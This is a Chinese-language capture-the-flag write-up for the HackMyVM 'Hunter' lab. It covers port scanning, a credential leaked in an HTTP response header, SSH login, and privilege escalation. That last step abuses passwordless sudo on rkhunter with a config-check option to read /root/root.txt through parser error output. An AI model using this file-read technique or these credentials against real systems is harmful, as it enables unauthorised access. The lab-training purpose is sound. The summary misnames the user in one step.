---
title: "Hunter"
date: 2026-04-26T19:30:15+08:00
draft: false
description: "HackMyVM 靶机 Hunter 的渗透测试与提权记录"
categories: ["靶机复盘"]
tags: ["HackMyVM", "Easy"]
---
![image-20260426134149431](image-20260426134149431.png)

## 信息收集

### 端口扫描

```sh
root@kali:~# nmap 192.168.56.104                        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 01:03 -0400
Nmap scan report for 192.168.56.104
Host is up (0.0010s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
MAC Address: 08:00:27:5E:55:41 (Oracle VirtualBox virtual NIC)

root@kali:~# nmap 192.168.56.104 -p 22,8080 -sC -sV
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-26 01:31 -0400
Nmap scan report for 192.168.56.104
Host is up (0.0015s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0 (protocol 2.0)
8080/tcp open  http    Golang net/http server
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Sun, 26 Apr 2026 05:31:50 GMT
|     Content-Length: 21
|     Content-Type: text/plain; charset=utf-8
|     Yes, thats a CTF :_(
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=4/26%Time=69EDA346%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,8A,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2026\x20Apr\x2020
SF:26\x2005:31:50\x20GMT\r\nContent-Length:\x2021\r\nContent-Type:\x20text
SF:/plain;\x20charset=utf-8\r\n\r\nYes,\x20thats\x20a\x20CTF\x20:_\(\n")%r
SF:(HTTPOptions,8A,"HTTP/1\.0\x20200\x20OK\r\nDate:\x20Sun,\x2026\x20Apr\x
SF:202026\x2005:31:50\x20GMT\r\nContent-Length:\x2021\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\n\r\nYes,\x20thats\x20a\x20CTF\x20:_\(\n
SF:")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request")%r(FourOhFourRequest,8A,"HTTP/1\.0\x20200\x20OK\r\nDat
SF:e:\x20Sun,\x2026\x20Apr\x202026\x2005:31:50\x20GMT\r\nContent-Length:\x
SF:2021\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n\r\nYes,\x20th
SF:ats\x20a\x20CTF\x20:_\(\n")%r(Socks5,67,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
SF:0close\r\n\r\n400\x20Bad\x20Request")%r(GenericLines,67,"HTTP/1\.1\x204
SF:00\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r
SF:\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1
SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(SSLSess
SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
SF:quest")%r(LPDString,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
SF:\x20Bad\x20Request")%r(SIPOptions,67,"HTTP/1\.1\x20400\x20Bad\x20Reques
SF:t\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20cl
SF:ose\r\n\r\n400\x20Bad\x20Request")%r(OfficeScan,A3,"HTTP/1\.1\x20400\x2
SF:0Bad\x20Request:\x20missing\x20required\x20Host\x20header\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
SF:x20Bad\x20Request:\x20missing\x20required\x20Host\x20header");
MAC Address: 08:00:27:5E:55:41 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.27 seconds
```

* 22 端口开放的ssh服务
* 8080 端口开放的http服务，版本是Golang net / http server
  * 存在robots.txt，内容：/admin路由 。

### web 枚举

```sh
root@kali:/tmp/123# dirsearch -u http://192.168.56.104:8080/
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /tmp/123/reports/http_192.168.56.104_8080/__26-04-26_01-22-53.txt

Target: http://192.168.56.104:8080/

[01:22:53] Starting: 
[01:22:53] 301 -   57B  - /%2e%2e//google.com  ->  /%252E%252E/google.com
[01:23:03] 200 -   13B  - /admin
[01:23:14] 301 -   54B  - /axis//happyaxis.jsp  ->  /axis/happyaxis.jsp
[01:23:14] 301 -   65B  - /axis2//axis2-web/HappyAxis.jsp  ->  /axis2/axis2-web/HappyAxis.jsp
[01:23:14] 301 -   59B  - /axis2-web//HappyAxis.jsp  ->  /axis2-web/HappyAxis.jsp
[01:23:17] 301 -   87B  - /Citrix//AccessPlatform/auth/clientscripts/cookies.js  ->  /Citrix/AccessPlatform/auth/clientscripts/cookies.js
[01:23:24] 301 -   74B  - /engine/classes/swfupload//swfupload.swf  ->  /engine/classes/swfupload/swfupload.swf
[01:23:24] 301 -   77B  - /engine/classes/swfupload//swfupload_f9.swf  ->  /engine/classes/swfupload/swfupload_f9.swf
[01:23:25] 301 -   62B  - /extjs/resources//charts.swf  ->  /extjs/resources/charts.swf
[01:23:29] 301 -   72B  - /html/js/misc/swfupload//swfupload.swf  ->  /html/js/misc/swfupload/swfupload.swf
[01:23:49] 200 -   31B  - /robots.txt
```

状态码为 200：

* /admin
* /robots.txt

### web 应用的初始分析

```sh
root@kali:/tmp/123# curl -v http://192.168.56.104:8080/     
*   Trying 192.168.56.104:8080...
* Established connection to 192.168.56.104 (192.168.56.104 port 8080) from 192.168.56.101 port 53542 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 192.168.56.104:8080
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 26 Apr 2026 05:58:13 GMT
< Content-Length: 21
< Content-Type: text/plain; charset=utf-8
< 
Yes, thats a CTF :_(
* Connection #0 to host 192.168.56.104:8080 left intact
```

提示：这是一个CTF题目

```sh
root@kali:/tmp/123# curl -v http://192.168.56.104:8080/admin                               
*   Trying 192.168.56.104:8080...
* Established connection to 192.168.56.104 (192.168.56.104 port 8080) from 192.168.56.101 port 48660 
* using HTTP/1.x
> GET /admin HTTP/1.1
> Host: 192.168.56.104:8080
> User-Agent: curl/8.18.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Sun, 26 Apr 2026 05:58:09 GMT
< Content-Length: 13
< Content-Type: text/plain; charset=utf-8
< 
Invalid JWT.
* Connection #0 to host 192.168.56.104:8080 left intact
```

 错误的JWT，从回显内容可以看出，只有正确的jwt才能获得admin的隐藏信息。

现在的问题是：并不知道jwt中payload主要包含的信息，导致我不确定到底使用哪种jwt攻击方式。

查看[noneofyour](https://hackmyvm.eu/profile/?user=noneofyour)的wp，发现修改为POST方法，`http://192.168.56.104`会多回显一个http响应头：`X-Secret-Creds: hunterman:thisisnitriilcisi`，22端口开启，猜测这可能是ssh连接的凭证。

## 初始访问

```sh
root@kali:/tmp/123# ssh hunterman@192.168.56.104 -p 22
The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
ED25519 key fingerprint is: SHA256:jt60cn6NFWsntzAw3UWEiADbNwlaTaBzCCwz5mqAh4M
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.104' (ED25519) to the list of known hosts.
hunterman@192.168.56.104's password: 
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.
hunter:~$ id
uid=1000(hunterman) gid=1000(hunterman) groups=1000(hunterman)
```

## 系统信息枚举

```sh
hunter:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
klogd:x:100:101:klogd:/dev/null:/sbin/nologin
hunterman:x:1000:1000::/home/hunterman:/bin/sh
huntergirl:x:1001:1001::/home/huntergirl:/bin/sh
```

存在三个用户：

* root 
* hunterman
* huntergirl

```sh
hunter:~$ sudo -l
[sudo] password for hunterman: 
Sorry, user hunterman may not run sudo on hunter.
```

发现 root 用户并没有给 hunterman 配 任何 sudo 权限。

```sh
hunter:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
---s--x--x    1 root     root         14224 Aug  5  2025 /bin/bbsuid
-rwsr-xr-x    1 root     root        199632 Jul 26  2025 /usr/bin/sudo
```

没有发现有用的suid位。

```sh
hunter:~$ netstat -tuln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
tcp        0      0 :::22                   :::*                    LISTEN      
tcp        0      0 :::8080                 :::*                    LISTEN  
```

本地开启的服务也只有 22 8080。

系统并没有 `getcap` 命令所以无法查看 `capablities` 能力位。

已知的提权方法都无用，猜测线索可能在huntergirl用户上，寻找huntergirl的登陆凭据。

在/var/www/html/robots.txt 发现了 huntergirl 的登陆凭据，登陆hunter：

```sh
hunter:/var/www/html$ su huntergirl
Password: 
/var/www/html $ sudo -l
Matching Defaults entries for huntergirl on hunter:
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for huntergirl:
    Defaults!/usr/sbin/visudo env_keep+="SUDO_EDITOR EDITOR VISUAL"

User huntergirl may run the following commands on hunter:
    (root) NOPASSWD: /usr/local/bin/rkhunter
```

发现`huntergirl`可以不密码以`root`权限执行`rkhunter`命令。

查看参数：

```sh

/var/www/html $ sudo /usr/local/bin/rkhunter --help

Usage: rkhunter {--check | --unlock | --update | --versioncheck |
                 --propupd [{filename | directory | package name},...] |
                 --list [{tests | {lang | languages} | rootkits | perl | propfiles}] |
                 --config-check | --version | --help} [options]

Current options are:
         --append-log                  Append to the logfile, do not overwrite
         --bindir <directory>...       Use the specified command directories
     -c, --check                       Check the local system
     -C, --config-check                Check the configuration file(s), then exit
  --cs2, --color-set2                  Use the second color set for output
         --configfile <file>           Use the specified configuration file
         --cronjob                     Run as a cron job
                                       (implies -c, --sk and --nocolors options)
         --dbdir <directory>           Use the specified database directory
         --debug                       Debug mode
                                       (Do not use unless asked to do so)
         --disable <test>[,<test>...]  Disable specific tests
                                       (Default is to disable no tests)
         --display-logfile             Display the logfile at the end
         --enable  <test>[,<test>...]  Enable specific tests
                                       (Default is to enable all tests)
         --hash {MD5 | SHA1 | SHA224 | SHA256 | SHA384 | SHA512 |
                 NONE | <command>}     Use the specified file hash function
                                       (Default is SHA256)
     -h, --help                        Display this help menu, then exit
 --lang, --language <language>         Specify the language to use
                                       (Default is English)
         --list [tests | languages |   List the available test names, languages,
                 rootkits | perl |     rootkit names, perl module status
                 propfiles]            or file properties database, then exit
     -l, --logfile [file]              Write to a logfile
                                       (Default is /var/log/rkhunter.log)
         --noappend-log                Do not append to the logfile, overwrite it
         --nocf                        Do not use the configuration file entries
                                       for disabled tests (only valid with --disable)
         --nocolors                    Use black and white output
         --nolog                       Do not write to a logfile
--nomow, --no-mail-on-warning          Do not send a message if warnings occur
   --ns, --nosummary                   Do not show the summary of check results
 --novl, --no-verbose-logging          No verbose logging
         --pkgmgr {RPM | DPKG | BSD |  Use the specified package manager to obtain
                   BSDng | SOLARIS |   or verify file property values.
                   NONE}               (Default is NONE)
         --propupd [file | directory | Update the entire file properties database,
                    package]...        or just for the specified entries
     -q, --quiet                       Quiet mode (no output at all)
  --rwo, --report-warnings-only        Show only warning messages
   --sk, --skip-keypress               Don't wait for a keypress after each test
         --summary                     Show the summary of system check results
                                       (This is the default)
         --syslog [facility.priority]  Log the check start and finish times to syslog
                                       (Default level is authpriv.notice)
         --tmpdir <directory>          Use the specified temporary directory
         --unlock                      Unlock (remove) the lock file
         --update                      Check for updates to database files
   --vl, --verbose-logging             Use verbose logging (on by default)
     -V, --version                     Display the version number, then exit
         --versioncheck                Check for latest version of program
     -x, --autox                       Automatically detect if X is in use
     -X, --no-autox                    Do not automatically detect if X is in 
```

发现这两个有用的参数：

```
     -C, --config-check                Check the configuration file(s), then exit
         --configfile <file>           Use the specified configuration file
```

## 权限提升

```sh
/var/www/html $ sudo /usr/local/bin/rkhunter -C --configfile /root/root.txt
Invalid SCRIPTDIR configuration option: No filename given, but it must exist.
Invalid INSTALLDIR configuration option - no installation directory specified.
The default logfile will be used: /var/log/rkhunter.log
Invalid TMPDIR configuration option: No filename given, but it must exist.
Invalid DBDIR configuration option: No filename given, but it must exist.
The internationalisation directory does not exist: /i18n
grep: bad regex ' HMV{FhOpuXDUlZFhOpuXDUlZ} ': Invalid contents of {}
Unknown configuration file option: HMV{FhOpuXDUlZFhOpuXDUlZ}
```

## 攻击链总结

1. 端口扫描发现目标仅开放 `22/tcp` 和 `8080/tcp`，指纹识别发现web 服务存在robots.txt 文件，其中给出了`/admin`路径，访问`/admin`时，页面显示`invalid jwt`，但进一步没有直接的利用价值
2. 继续对Web应用做交互测试后发现，请求方式换为post方法后，服务端会在`HTTP`响应头中泄露凭据：`X-Secret-Creds: hunterman:thisisnitriilcisi`。利用这组凭据可通过SSH登陆目标主机，获得`hunterman`用户的初始shell。
3. 以 `huntergirl` 身份进行本地枚举，未发现可直接利用的sudo权限或明显有效的SUID 提权点；随后在系统中发现另一个用户 huntergirl，并在本地Web目录的robots.txt 文件中找到其登陆凭据，成功切换到 `huntergirl` 用户。
4. 以 `huntergirl` 身份执行`sudo -l`，发现该用户可无密码以 `root` 身份运行 `/usr/local/bin/rkhunter`。进一步查看帮助信息可知，该程序支持 `-C` 与 `--configfile` 参数，可加载指定配置文件，并对其进行检查。 
5. 利用`sudo /usr/local/bin/rkhunter -C --configfile /root/root.txt`，将目标文件作为配置文件解析。由于 rkhunter 会在解析失败时报错并回显异常内容，从而实现任意文件读取，最终读取到`/root/root.txt`, 完成提权目标验证。
